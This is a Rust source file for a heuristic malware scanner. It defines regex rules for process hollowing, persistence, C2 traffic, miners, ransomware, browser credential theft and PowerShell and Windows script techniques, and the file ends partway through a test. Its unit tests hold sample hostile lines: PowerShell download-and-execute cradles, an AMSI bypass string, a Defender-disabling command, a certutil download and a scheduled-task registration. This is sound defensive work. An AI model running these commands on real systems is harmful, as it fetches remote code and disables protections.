use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;
use tokio::fs;
use tracing::{debug, info};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeuristicMatch {
    pub rule_id: String,
    pub rule_name: String,
    pub description: String,
    pub severity: HeuristicSeverity,
    pub confidence: f32,
    pub matched_content: Option<String>,
    pub offset: Option<usize>,
    pub context: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum HeuristicSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl HeuristicSeverity {
    pub fn score(&self) -> u8 {
        match self {
            Self::Info => 1,
            Self::Low => 2,
            Self::Medium => 4,
            Self::High => 7,
            Self::Critical => 10,
        }
    }

    /// How much one rule of this severity counts toward the verdict.
    pub fn points(&self) -> u32 {
        match self {
            Self::Info => 0,
            Self::Low => 1,
            Self::Medium => 2,
            Self::High | Self::Critical => 3,
        }
    }
}

#[derive(Debug, Clone)]
pub struct HeuristicRule {
    pub id: String,
    pub name: String,
    pub description: String,
    pub pattern: Regex,
    pub severity: HeuristicSeverity,
    pub confidence: f32,
    pub file_types: Vec<String>,
    #[allow(clippy::type_complexity)]
    pub context_extractor: Option<fn(&str, usize) -> HashMap<String, String>>,
}

pub struct HeuristicEngine {
    rules: Vec<HeuristicRule>,
    max_file_size: usize,
    timeout_seconds: u64,
}

impl Default for HeuristicEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl HeuristicEngine {
    pub fn new() -> Self {
        let mut engine = Self {
            rules: Vec::new(),
            max_file_size: 50 * 1024 * 1024, // 50MB
            timeout_seconds: 30,
        };

        engine.load_default_rules();
        engine
    }

    pub fn with_config(max_file_size: usize, timeout_seconds: u64) -> Self {
        let mut engine = Self {
            rules: Vec::new(),
            max_file_size,
            timeout_seconds,
        };

        engine.load_default_rules();
        engine
    }

    fn load_default_rules(&mut self) {
        // Malware-related heuristics
        self.add_malware_rules();

        // Exploit-related heuristics
        self.add_exploit_rules();

        // Suspicious network activity
        self.add_network_rules();

        // Obfuscation detection
        self.add_obfuscation_rules();

        // Cryptocurrency mining detection
        self.add_cryptominer_rules();

        // Ransomware indicators
        self.add_ransomware_rules();

        // Information stealing patterns
        self.add_stealer_rules();

        // Script, macro-launcher and shortcut techniques
        self.add_script_rules();
    }

    fn add_malware_rules(&mut self) {
        // Suspicious API calls

        // Registry manipulation
        self.rules.push(HeuristicRule {
            id: "HEUR_002".to_string(),
            name: "Registry Persistence".to_string(),
            description: "Detects attempts to modify registry for persistence".to_string(),
            pattern: Regex::new(r"(?i)(HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run)").unwrap(),
            severity: HeuristicSeverity::Medium,
            confidence: 0.8,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_registry_context),
        });

        // Process hollowing indicators
        self.rules.push(HeuristicRule {
            id: "HEUR_003".to_string(),
            name: "Process Hollowing Pattern".to_string(),
            description: "Detects patterns indicative of process hollowing technique".to_string(),
            pattern: Regex::new(r"(?i)(NtUnmapViewOfSection|ZwUnmapViewOfSection|CreateProcessA[^\x00\n]{0,64}SUSPENDED|WriteProcessMemory[^\x00\n]{0,64}ResumeThread)").unwrap(),
            severity: HeuristicSeverity::High,
            confidence: 0.85,
            file_types: vec!["exe".to_string(), "dll".to_string()],
            context_extractor: None,
        });
    }

    fn add_exploit_rules(&mut self) {
        // Buffer overflow patterns
        self.rules.push(HeuristicRule {
            id: "HEUR_101".to_string(),
            name: "Buffer Overflow Pattern".to_string(),
            description: "Detects potential buffer overflow exploit patterns".to_string(),
            pattern: Regex::new(r"(\x41{50,}|\x90{20,})").unwrap(),
            severity: HeuristicSeverity::High,
            confidence: 0.6,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_exploit_context),
        });

        // Shellcode patterns
        self.rules.push(HeuristicRule {
            id: "HEUR_103".to_string(),
            name: "Shellcode Pattern".to_string(),
            description: "Detects common shellcode patterns and opcodes".to_string(),
            pattern: Regex::new(r"(?i)(\\x[0-9a-f]{2}){20,}").unwrap(),
            severity: HeuristicSeverity::Medium,
            confidence: 0.4,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_shellcode_context),
        });
    }

    fn add_network_rules(&mut self) {
        // C2 communication patterns
        self.rules.push(HeuristicRule {
            id: "HEUR_201".to_string(),
            name: "C2 Communication Pattern".to_string(),
            description: "Detects patterns indicative of C2 server communication".to_string(),
            pattern: Regex::new(
                r"(?i)(POST [^\x00\n]{0,80}admin\.php|GET [^\x00\n]{0,80}gate\.php|User-Agent:\s*Mozilla/4\.0)",
            )
            .unwrap(),
            severity: HeuristicSeverity::High,
            confidence: 0.7,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_network_context),
        });

        // IRC bot patterns
        self.rules.push(HeuristicRule {
            id: "HEUR_203".to_string(),
            name: "IRC Bot Pattern".to_string(),
            description: "Detects IRC bot communication patterns".to_string(),
            pattern: Regex::new(r"(?i)(PRIVMSG [^\x00\n]{0,64}!bot|NICK [^\x00\n]{0,32}bot[0-9]+)")
                .unwrap(),
            severity: HeuristicSeverity::Medium,
            confidence: 0.8,
            file_types: vec!["*".to_string()],
            context_extractor: None,
        });
    }

    fn add_obfuscation_rules(&mut self) {
        // Base64 encoded content
        self.rules.push(HeuristicRule {
            id: "HEUR_301".to_string(),
            name: "Base64 Obfuscation".to_string(),
            description: "Detects suspicious base64 encoded content".to_string(),
            pattern: Regex::new(r"[A-Za-z0-9+/]{100,}={0,2}").unwrap(),
            severity: HeuristicSeverity::Low,
            confidence: 0.3,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_base64_context),
        });

        // String obfuscation
        self.rules.push(HeuristicRule {
            id: "HEUR_303".to_string(),
            name: "String Obfuscation".to_string(),
            description: "Detects obfuscated string patterns".to_string(),
            pattern: Regex::new(r"(?i)(\\x[0-9a-f]{2}\\x[0-9a-f]{2}){5,}").unwrap(),
            severity: HeuristicSeverity::Low,
            confidence: 0.4,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_string_obfuscation_context),
        });
    }

    fn add_cryptominer_rules(&mut self) {
        // Mining pool connections
        self.rules.push(HeuristicRule {
            id: "HEUR_401".to_string(),
            name: "Cryptocurrency Mining Pool".to_string(),
            description: "Detects connections to cryptocurrency mining pools".to_string(),
            pattern: Regex::new(r"(?i)(stratum\+(tcp|ssl)://|\bnicehash\.com\b)").unwrap(),
            severity: HeuristicSeverity::High,
            confidence: 0.9,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_mining_context),
        });

        // Mining software indicators
        self.rules.push(HeuristicRule {
            id: "HEUR_402".to_string(),
            name: "Mining Software Pattern".to_string(),
            description: "Detects patterns indicative of cryptocurrency mining software"
                .to_string(),
            pattern: Regex::new(r"(?i)(xmrig|cpuminer|ethminer|claymore)").unwrap(),
            severity: HeuristicSeverity::High,
            confidence: 0.85,
            file_types: vec!["exe".to_string(), "elf".to_string()],
            context_extractor: None,
        });
    }

    fn add_ransomware_rules(&mut self) {
        // File encryption patterns
        self.rules.push(HeuristicRule {
            id: "HEUR_501".to_string(),
            name: "File Encryption Pattern".to_string(),
            description: "Detects patterns indicative of file encryption (ransomware)".to_string(),
            pattern: Regex::new(r#"[A-Za-z0-9_\-]\.(encrypted|locked|crypto|Encrypted|Locked)(?:$|[\s"'\x00,;)\]])|YOUR_FILES_ARE_ENCRYPTED|DECRYPT_INSTRUCTIONS"#)
                .unwrap(),
            severity: HeuristicSeverity::Critical,
            confidence: 0.9,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_ransomware_context),
        });
    }

    fn add_script_rules(&mut self) {
        // Each pattern names a specific attacker technique and requires the
        // surrounding context, not a single word: "Invoke-Expression" or
        // "WScript.Shell" alone appear in ordinary admin scripts. Checked for
        // false positives against Pester, PSScriptAnalyzer, jQuery and
        // Bootstrap (benchmark clean sources).
        const PS: &[&str] = &[
            "ps1", "psm1", "psd1", "bat", "cmd", "lnk", "hta", "vbs", "js", "wsf",
        ];
        const WSH: &[&str] = &["js", "jse", "vbs", "vbe", "wsf", "wsh", "hta"];
        const ANY_SCRIPT: &[&str] = &[
            "ps1", "psm1", "psd1", "bat", "cmd", "lnk", "hta", "vbs", "vbe", "js", "jse", "wsf",
            "wsh",
        ];
        let mut add = |id: &str,
                       name: &str,
                       description: &str,
                       pattern: &str,
                       severity: HeuristicSeverity,
                       types: &[&str]| {
            self.rules.push(HeuristicRule {
                id: id.to_string(),
                name: name.to_string(),
                description: description.to_string(),
                pattern: Regex::new(pattern).expect("script rule pattern"),
                severity,
                confidence: 0.8,
                file_types: types.iter().map(|t| t.to_string()).collect(),
                context_extractor: None,
            });
        };

        // ── PowerShell ─────────────────────────────────────────────────
        add(
            "SCRIPT_101",
            "PowerShell download and execute",
            "Downloads code and runs it in memory (a download cradle)",
            r"(?i)(\biex\b|invoke-expression)[^\n]{0,200}(downloadstring|downloaddata|net\.webclient|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b)|(downloadstring|downloaddata|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b)[^\n]{0,200}(\|\s*iex\b|invoke-expression)",
            HeuristicSeverity::High,
            PS,
        );
        add(
            "SCRIPT_102",
            "PowerShell encoded command",
            "Starts PowerShell with a base64-encoded command line",
            r"(?i)powershell(\.exe)?[^\n]{0,120}\s[-/]e(nc|ncodedcommand|c)?\s+[A-Za-z0-9+/=]{40,}",
            HeuristicSeverity::High,
            ANY_SCRIPT,
        );
        add(
            "SCRIPT_103",
            "Hidden PowerShell launch",
            "Starts PowerShell with a hidden window and no profile or policy",
            r"(?i)powershell(\.exe)?[^\n]{0,80}\s[-/]w(indowstyle)?\s+h(idden)?\b",
            HeuristicSeverity::Medium,
            ANY_SCRIPT,
        );
        add(
            "SCRIPT_104",
            "AMSI bypass",
            "Disables Windows' Antimalware Scan Interface",
            r"(?i)amsiInitFailed|AmsiUtils|AmsiScanBuffer|amsi\.dll",
            HeuristicSeverity::High,
            ANY_SCRIPT,
        );
        add(
            "SCRIPT_105",
            "In-memory assembly from base64",
            "Decodes base64 and loads it as a .NET assembly",
            r"(?i)FromBase64String[^\n]{0,300}\]::Load\(|\]::Load\([^\n]{0,300}FromBase64String",
            HeuristicSeverity::High,
            PS,
        );
        add(
            "SCRIPT_106",
            "Defender tampering",
            "Turns off Microsoft Defender or excludes paths from it",
            r"(?i)(Set|Add)-MpPreference[^\n]{0,120}-(DisableRealtimeMonitoring|DisableIOAVProtection|DisableBehaviorMonitoring|ExclusionPath|ExclusionProcess|ExclusionExtension)",
            HeuristicSeverity::High,
            ANY_SCRIPT,
        );
        add(
            "SCRIPT_107",
            "Character-code obfuscation",
            "Builds code from long runs of character codes",
            r"(?i)(\[char\]\s*\(?\s*0?x?[0-9a-f]{2,3}\s*\)?\s*[+,]\s*){12,}|(chrw?\(\s*\d{2,3}\s*\)\s*&\s*){12,}|fromCharCode\((\s*\d{2,3}\s*,){16,}",
            HeuristicSeverity::Medium,
            ANY_SCRIPT,
        );

        // ── Windows Script Host (JScript, VBScript, HTA) ───────────────
        add(
            "SCRIPT_201",
            "Script downloads a file to disk",
            "Fetches a URL and writes the response with ADODB.Stream",
            r"(?is)(MSXML2\.(Server)?XMLHTTP|WinHttp\.WinHttpRequest|Microsoft\.XMLHTTP).{0,3000}ADODB\.Stream|ADODB\.Stream.{0,3000}(MSXML2\.(Server)?XMLHTTP|WinHttp\.WinHttpRequest|Microsoft\.XMLHTTP)",
            HeuristicSeverity::High,
            WSH,
        );
        add(
            "SCRIPT_202",
            "Script runs commands",
            "Creates WScript.Shell or Shell.Application and runs a program",
            r"(?is)(ActiveXObject|CreateObject|GetObject)\(\s*[\x22']?(WScript\.Shell|Shell\.Application)[\x22']?\s*\).{0,1500}\.(Run|Exec|ShellExecute)\b",
            HeuristicSeverity::Medium,
            WSH,
        );
        add(
            "SCRIPT_203",
            "Decode-then-eval",
            "Evaluates code that is decoded or unescaped at run time",
            r"(?i)\beval\s*\(\s*(unescape|atob|decodeURIComponent|String\.fromCharCode)\s*\(|\bExecute(Global)?\s*\(?\s*(StrReverse|Replace|Chr)\s*\(",
            HeuristicSeverity::High,
            WSH,
        );

        // ── Living-off-the-land binaries, from any script or shortcut ──
        add(
            "SCRIPT_301",
            "Windows tool used to download or decode",
            "certutil, bitsadmin, mshta, regsvr32 or rundll32 used to fetch or run remote code",
            r"(?i)\bcertutil(\.exe)?\b[^\n]{0,80}[-/](urlcache|decode)|\bbitsadmin(\.exe)?\b[^\n]{0,80}/transfer|\bmshta(\.exe)?\b[^\n]{0,60}(https?:|javascript:|vbscript:)|\bregsvr32(\.exe)?\b[^\n]{0,80}/i:\s*https?:|\brundll32(\.exe)?\b[^\n]{0,80}javascript:",
            HeuristicSeverity::High,
            ANY_SCRIPT,
        );
        add(
            "SCRIPT_302",
            "Scheduled task or Run key persistence",
            "Registers a scheduled task or a Run key from a script",
            r"(?i)\bschtasks(\.exe)?\b[^\n]{0,60}/create|\breg(\.exe)?\s+add\s+[^\n]{0,40}\\CurrentVersion\\Run\b",
            HeuristicSeverity::Medium,
            ANY_SCRIPT,
        );

        // ── Shortcuts ──────────────────────────────────────────────────
        add(
            "SCRIPT_401",
            "Shortcut launches a script host",
            "A .lnk file that starts PowerShell, cmd, mshta or a script host",
            r"(?i)\b(powershell|pwsh|mshta|wscript|cscript|conhost)(\.exe)?\b|\bcmd(\.exe)?\s+/[ck]\b",
            HeuristicSeverity::Medium,
            &["lnk"],
        );
    }

    fn add_stealer_rules(&mut self) {
        // Password/credential stealing patterns

        // Browser data theft
        self.rules.push(HeuristicRule {
            id: "HEUR_602".to_string(),
            name: "Browser Data Theft".to_string(),
            description: "Detects attempts to steal browser data".to_string(),
            pattern: Regex::new(r"(?i)(Google\\Chrome\\User Data|Microsoft\\Edge\\User Data|BraveSoftware\\Brave-Browser\\User Data|Mozilla\\Firefox\\Profiles|Opera Software\\Opera (Stable|GX Stable)|\\Login Data\b|\\Local State\b)")
                .unwrap(),
            severity: HeuristicSeverity::High,
            confidence: 0.75,
            file_types: vec!["*".to_string()],
            context_extractor: Some(extract_browser_context),
        });
    }

    pub async fn analyze_file(
        &self,
        file_path: &Path,
    ) -> Result<Vec<HeuristicMatch>, Box<dyn std::error::Error + Send + Sync>> {
        let metadata = fs::metadata(file_path).await?;

        if metadata.len() as usize > self.max_file_size {
            return Err(format!("File too large: {} bytes", metadata.len()).into());
        }

        let content = fs::read(file_path).await?;
        let content_str = String::from_utf8_lossy(&content);

        self.analyze_content(&content_str, file_path).await
    }

    pub async fn analyze_content(
        &self,
        content: &str,
        file_path: &Path,
    ) -> Result<Vec<HeuristicMatch>, Box<dyn std::error::Error + Send + Sync>> {
        let mut matches = Vec::new();
        let file_ext = file_path
            .extension()
            .and_then(|s| s.to_str())
            .unwrap_or("")
            .to_lowercase();

        for rule in &self.rules {
            // Check if rule applies to this file type
            if !rule.file_types.contains(&"*".to_string()) && !rule.file_types.contains(&file_ext) {
                continue;
            }

            // Apply the rule
            for mat in rule.pattern.find_iter(content) {
                let mut context = HashMap::new();

                // Extract context if available
                if let Some(extractor) = rule.context_extractor {
                    context = extractor(content, mat.start());
                }

                let heuristic_match = HeuristicMatch {
                    rule_id: rule.id.clone(),
                    rule_name: rule.name.clone(),
                    description: rule.description.clone(),
                    severity: rule.severity.clone(),
                    confidence: rule.confidence,
                    matched_content: Some(mat.as_str().to_string()),
                    offset: Some(mat.start()),
                    context,
                };

                matches.push(heuristic_match);
                debug!("Heuristic match: {} at offset {}", rule.name, mat.start());
            }
        }

        info!(
            "Heuristic analysis complete: {} matches found",
            matches.len()
        );
        Ok(matches)
    }

    /// Points from the distinct rules that matched. Each rule counts once, so
    /// a large file can't add up a verdict from many copies of one weak match.
    /// (This used to be an average, so a single weak match scored like ten.)
    pub fn calculate_risk_score(&self, matches: &[HeuristicMatch]) -> f32 {
        let mut seen = std::collections::HashSet::new();
        matches
            .iter()
            .filter(|m| seen.insert(m.rule_id.as_str()))
            .map(|m| m.severity.points())
            .sum::<u32>() as f32
    }
}

impl HeuristicEngine {
    pub fn name(&self) -> &str {
        "heuristic_engine"
    }

    pub fn version(&self) -> &str {
        "1.0.0"
    }
}

/// `content[start..end]`, widened to the nearest character boundaries.
///
/// Match offsets plus a fixed byte window can land inside a multi-byte
/// character (any non-ASCII text in a file), and slicing there panics.
fn snippet(content: &str, start: usize, end: usize) -> &str {
    let mut start = start.min(content.len());
    while !content.is_char_boundary(start) {
        start -= 1;
    }
    let mut end = end.clamp(start, content.len());
    while !content.is_char_boundary(end) {
        end += 1;
    }
    &content[start..end]
}

fn extract_registry_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    // Look for registry key patterns
    let start = offset.saturating_sub(50);
    let end = std::cmp::min(offset + 200, content.len());
    let surrounding = snippet(content, start, end);

    context.insert("registry_location".to_string(), surrounding.to_string());
    context.insert(
        "persistence_method".to_string(),
        "registry_run_key".to_string(),
    );

    context
}

fn extract_exploit_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset.saturating_sub(20);
    let end = std::cmp::min(offset + 100, content.len());
    let pattern = snippet(content, start, end);

    context.insert(
        "exploit_pattern".to_string(),
        format!("{:?}", pattern.as_bytes()),
    );
    context.insert("pattern_type".to_string(), "buffer_overflow".to_string());

    context
}

fn extract_shellcode_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset.saturating_sub(10);
    let end = std::cmp::min(offset + 50, content.len());
    let shellcode = snippet(content, start, end);

    context.insert(
        "shellcode_bytes".to_string(),
        format!("{:?}", shellcode.as_bytes()),
    );

    context
}

fn extract_network_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset.saturating_sub(50);
    let end = std::cmp::min(offset + 200, content.len());
    let network_data = snippet(content, start, end);

    context.insert(
        "network_communication".to_string(),
        network_data.to_string(),
    );
    context.insert("communication_type".to_string(), "c2_pattern".to_string());

    context
}

fn extract_base64_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset;
    let end = std::cmp::min(offset + 200, content.len());
    let b64_content = snippet(content, start, end);

    context.insert(
        "encoded_preview".to_string(),
        b64_content.trim().to_string(),
    );
    context.insert("encoded_length".to_string(), b64_content.len().to_string());

    context
}

fn extract_string_obfuscation_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset;
    let end = std::cmp::min(offset + 100, content.len());
    let obfuscated = snippet(content, start, end);

    context.insert("obfuscated_string".to_string(), obfuscated.to_string());
    context.insert("obfuscation_type".to_string(), "hex_escape".to_string());

    context
}

fn extract_mining_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset.saturating_sub(30);
    let end = std::cmp::min(offset + 100, content.len());
    let mining_data = snippet(content, start, end);

    context.insert("mining_pool".to_string(), mining_data.to_string());

    context
}

fn extract_ransomware_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset.saturating_sub(50);
    let end = std::cmp::min(offset + 200, content.len());
    let ransom_context = snippet(content, start, end);

    context.insert("ransom_message".to_string(), ransom_context.to_string());

    context
}

fn extract_browser_context(content: &str, offset: usize) -> HashMap<String, String> {
    let mut context = HashMap::new();

    let start = offset.saturating_sub(30);
    let end = std::cmp::min(offset + 100, content.len());
    let browser_path = snippet(content, start, end);

    context.insert("browser_data_path".to_string(), browser_path.to_string());

    context
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn snippet_never_splits_a_character() {
        let text = "式式式"; // 3 bytes each
        assert_eq!(snippet(text, 1, 2), "式");
        assert_eq!(snippet(text, 4, 7), "式式式"[3..9].to_string());
        assert_eq!(snippet(text, 0, 100), text);
        assert_eq!(snippet(text, 50, 100), "");
    }

    #[tokio::test]
    async fn non_ascii_text_around_a_match_does_not_panic() {
        // 40 three-byte characters put the match at byte 120, so the
        // 100-byte context window starts at byte 20, inside a character.
        let content = format!(
            "{}NtUnmapViewOfSection WriteProcessMemory ResumeThread{}",
            "式".repeat(40),
            "式".repeat(40)
        );
        let engine = HeuristicEngine::new();
        let matches = engine
            .analyze_content(&content, std::path::Path::new("sample.exe"))
            .await
            .unwrap();
        assert!(!matches.is_empty());
    }

    #[tokio::test]
    async fn test_heuristic_engine_creation() {
        let engine = HeuristicEngine::new();
        assert!(!engine.rules.is_empty());
        assert_eq!(engine.name(), "heuristic_engine");
        assert_eq!(engine.version(), "1.0.0");
    }

    #[tokio::test]
    async fn test_malware_detection() {
        let engine = HeuristicEngine::new();
        let malicious_content = "NtUnmapViewOfSection WriteProcessMemory ResumeThread";

        // Write to a temp file with an .exe extension so executable-scoped
        // heuristic rules apply (rules are filtered by file extension).
        let mut temp_file = tempfile::Builder::new().suffix(".exe").tempfile().unwrap();
        temp_file.write_all(malicious_content.as_bytes()).unwrap();
        temp_file.flush().unwrap();

        let matches = engine.analyze_file(temp_file.path()).await.unwrap();
        assert!(!matches.is_empty());

        let risk_score = engine.calculate_risk_score(&matches);
        assert!(risk_score > 0.0);
    }

    #[tokio::test]
    async fn test_registry_persistence_detection() {
        let engine = HeuristicEngine::new();
        let registry_content =
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

        let matches = engine
            .analyze_content(registry_content, Path::new("test.txt"))
            .await
            .unwrap();
        assert!(!matches.is_empty());

        let registry_match = matches.iter().find(|m| m.rule_id == "HEUR_002");
        assert!(registry_match.is_some());
    }

    #[tokio::test]
    async fn test_ransomware_detection() {
        let engine = HeuristicEngine::new();
        let ransomware_content = "YOUR_FILES_ARE_ENCRYPTED.txt";

        let matches = engine
            .analyze_content(ransomware_content, Path::new("test.txt"))
            .await
            .unwrap();
        assert!(!matches.is_empty());

        let ransomware_match = matches.iter().find(|m| m.rule_id == "HEUR_501");
        assert!(ransomware_match.is_some());

        if let Some(mat) = ransomware_match {
            assert!(matches![mat.severity, HeuristicSeverity::Critical]);
        }
    }

    #[tokio::test]
    async fn test_cryptominer_detection() {
        let engine = HeuristicEngine::new();
        let miner_content = "stratum+tcp://xmr-usa-east1.nanopool.org:14433";

        let matches = engine
            .analyze_content(miner_content, Path::new("test.exe"))
            .await
            .unwrap();
        assert!(!matches.is_empty());

        let miner_match = matches.iter().find(|m| m.rule_id == "HEUR_401");
        assert!(miner_match.is_some());

        if let Some(mat) = miner_match {
            assert!(matches![mat.severity, HeuristicSeverity::High]);
        }
    }

    #[tokio::test]
    async fn test_base64_obfuscation_detection() {
        let engine = HeuristicEngine::new();
        let b64_content = "VGhpcyBpcyBhIHRlc3Qgc3RyaW5nIGZvciBiYXNlNjQgZGV0ZWN0aW9uIHRoYXQgaXMgbG9uZyBlbm91Z2ggdG8gdHJpZ2dlciB0aGUgaGV1cmlzdGljIHJ1bGU=";

        let matches = engine
            .analyze_content(b64_content, Path::new("test.txt"))
            .await
            .unwrap();
        assert!(!matches.is_empty());

        let b64_match = matches.iter().find(|m| m.rule_id == "HEUR_301");
        assert!(b64_match.is_some());
    }

    #[tokio::test]
    async fn test_risk_score_calculation() {
        let engine = HeuristicEngine::new();

        let matches = vec![
            HeuristicMatch {
                rule_id: "TEST_001".to_string(),
                rule_name: "Test Rule High".to_string(),
                description: "Test description".to_string(),
                severity: HeuristicSeverity::High,
                confidence: 0.9,
                matched_content: None,
                offset: None,
                context: HashMap::new(),
            },
            HeuristicMatch {
                rule_id: "TEST_002".to_string(),
                rule_name: "Test Rule Medium".to_string(),
                description: "Test description".to_string(),
                severity: HeuristicSeverity::Medium,
                confidence: 0.7,
                context: HashMap::new(),
                matched_content: None,
                offset: None,
            },
        ];

        // High (3) + Medium (2), each counted once.
        let mut doubled = matches.clone();
        doubled.extend(matches.clone());
        assert_eq!(engine.calculate_risk_score(&matches), 5.0);
        assert_eq!(engine.calculate_risk_score(&doubled), 5.0);
    }

    #[tokio::test]
    async fn test_file_type_filtering() {
        let engine = HeuristicEngine::new();

        // Test with .exe file - should match executable rules
        let exe_content = "NtUnmapViewOfSection";
        let exe_matches = engine
            .analyze_content(exe_content, Path::new("test.exe"))
            .await
            .unwrap();

        // Test with .txt file - should not match executable-specific rules
        let txt_matches = engine
            .analyze_content(exe_content, Path::new("test.txt"))
            .await
            .unwrap();

        // .exe should have more matches due to executable-specific rules
        assert!(exe_matches.len() >= txt_matches.len());
    }

    #[tokio::test]
    async fn test_clean_file() {
        let engine = HeuristicEngine::new();
        let clean_content = "This is a perfectly normal text file with no suspicious content.";

        let matches = engine
            .analyze_content(clean_content, Path::new("clean.txt"))
            .await
            .unwrap();
        let risk_score = engine.calculate_risk_score(&matches);

        assert_eq!(risk_score, 0.0);
    }

    #[tokio::test]
    async fn test_multiple_threat_types() {
        let engine = HeuristicEngine::new();
        let multi_threat_content = r#"
            NtUnmapViewOfSection
            HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
            stratum+tcp://pool.example.com:4444
            YOUR_FILES_ARE_ENCRYPTED
            1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
        "#;

        let matches = engine
            .analyze_content(multi_threat_content, Path::new("malware.exe"))
            .await
            .unwrap();

        // Should detect multiple different threat types
        assert!(matches.len() >= 4);

        // Verify we have matches from different categories
        let rule_ids: Vec<&String> = matches.iter().map(|m| &m.rule_id).collect();
        assert!(rule_ids.contains(&&"HEUR_003".to_string())); // Process hollowing
        assert!(rule_ids.contains(&&"HEUR_002".to_string())); // Registry persistence
        assert!(rule_ids.contains(&&"HEUR_401".to_string())); // Mining pool
        assert!(rule_ids.contains(&&"HEUR_501".to_string())); // Ransomware

        let risk_score = engine.calculate_risk_score(&matches);
        assert!(risk_score >= 5.0); // Malicious
    }

    #[tokio::test]
    async fn rules_that_fire_on_clean_software_are_gone() {
        let engine = HeuristicEngine::new();
        // Each of these used to flag a file on its own.
        let content = "CreateProcess GetProcAddress password login credential \
            1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa 10.0.0.1 pool.example.com:80 \
            System.Security.Cryptography X\x00Y\x00Z\x00W";
        let matches = engine
            .analyze_content(content, Path::new("tool.exe"))
            .await
            .unwrap();
        assert_eq!(engine.calculate_risk_score(&matches), 0.0, "{matches:?}");
    }

    #[tokio::test]
    async fn bounded_patterns_do_not_span_unrelated_text() {
        let engine = HeuristicEngine::new();
        let far = format!("WriteProcessMemory{}ResumeThread", "x".repeat(500));
        let matches = engine
            .analyze_content(&far, Path::new("a.exe"))
            .await
            .unwrap();
        assert!(matches.iter().all(|m| m.rule_id != "HEUR_003"));
    }

    async fn ids(content: &str, name: &str) -> Vec<String> {
        let engine = HeuristicEngine::new();
        let mut v: Vec<String> = engine
            .analyze_content(content, Path::new(name))
            .await
            .unwrap()
            .into_iter()
            .map(|m| m.rule_id)
            .collect();
        v.sort();
        v.dedup();
        v
    }

    #[tokio::test]
    async fn powershell_techniques_are_recognised() {
        let cradle = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')";
        assert!(ids(cradle, "a.ps1")
            .await
            .contains(&"SCRIPT_101".to_string()));
        let piped = "iwr http://example.invalid/a -UseBasicParsing | iex";
        assert!(ids(piped, "a.ps1")
            .await
            .contains(&"SCRIPT_101".to_string()));
        let enc = format!(
            "powershell.exe -nop -w hidden -enc {}",
            "SQBFAFgA".repeat(8)
        );
        let found = ids(&enc, "run.bat").await;
        assert!(
            found.contains(&"SCRIPT_102".to_string()) && found.contains(&"SCRIPT_103".to_string())
        );
        assert!(ids(
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
            "a.ps1"
        )
        .await
        .contains(&"SCRIPT_104".to_string()));
        assert!(
            ids("Set-MpPreference -DisableRealtimeMonitoring $true", "a.ps1")
                .await
                .contains(&"SCRIPT_106".to_string())
        );
    }

    #[tokio::test]
    async fn wsh_and_lolbin_techniques_are_recognised() {
        let dropper = r#"var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET", u, false);
            var s = new ActiveXObject("ADODB.Stream"); s.SaveToFile(p, 2);"#;
        assert!(ids(dropper, "a.js")
            .await
            .contains(&"SCRIPT_201".to_string()));
        let runner = r#"Set sh = CreateObject("WScript.Shell")
            sh.Run "cmd /c calc", 0"#;
        assert!(ids(runner, "a.vbs")
            .await
            .contains(&"SCRIPT_202".to_string()));
        assert!(ids("eval(unescape('%61%6c%65%72%74'))", "a.js")
            .await
            .contains(&"SCRIPT_203".to_string()));
        assert!(ids(
            "certutil -urlcache -split -f http://example.invalid/a.exe a.exe",
            "a.bat"
        )
        .await
        .contains(&"SCRIPT_301".to_string()));
        assert!(ids("schtasks /create /sc minute /tn x /tr a.exe", "a.cmd")
            .await
            .contains(&"SCRIPT_302".to_string()));
    }

    #[tokio::test]
    async fn ordinary_scripts_stay_quiet() {
        // Admin and library code that uses the same building blocks legitimately.
        let admin = r#"$r = Invoke-WebRequest -Uri $Url -OutFile $Path
            Invoke-Expression -Command $Command
            $bytes = [Convert]::FromBase64String($b64)
            Set-MpPreference -SignatureUpdateInterval 4
            $shell = New-Object -ComObject WScript.Shell"#;
        assert!(ids(admin, "deploy.ps1")
            .await
            .iter()
            .all(|i| !i.starts_with("SCRIPT_")));
        let lib = "function locked() { return !!locked; } var t = eval('(' + json + ')');";
        assert!(ids(lib, "lib.js")
            .await
            .iter()
            .all(|i| !i.starts_with("SCRIPT_")));
        let css_map =
